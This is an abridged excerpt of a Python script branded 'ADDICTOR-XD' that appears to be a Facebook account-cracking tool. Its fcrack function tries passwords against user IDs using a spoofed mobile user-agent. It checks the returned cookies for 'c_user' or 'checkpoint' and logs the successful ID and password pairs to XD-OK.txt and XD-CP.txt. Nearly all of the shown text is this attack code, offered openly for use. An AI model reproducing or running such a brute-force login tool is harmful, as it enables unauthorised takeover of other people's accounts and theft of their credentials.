...
Y88b  d88P      Y88b  d88P      Y88b  d88P R\033[93;1m 
 ...
 \033[1;32m ORIGINAL CREDIT \033[94;1m (ADDICTOR-XD)
--------------------------------------------------
...
def Haroon():
	...
	#Credit goes to ADDICTOR-XD (HAROON PATHAAN)
	print(logo)
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=0zCdY_D5U5IZS0TIZgbh2DR_; sb=0zCdY7TTnD21zZamIQzBV0e5; fr=0eXDy6Me9FGYlGbbO.AWUAB87RO6QrK0sZi1xH5beAY3Q.Bj1q6p.CL.AAA.0.0.BkD2G0.AWX3C9ktkUA; locale=en_US',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[XD-OK] '+cid+' | '+ps+'\x1b[1;97m')
                open('XD-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mADDICTOR-XD\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
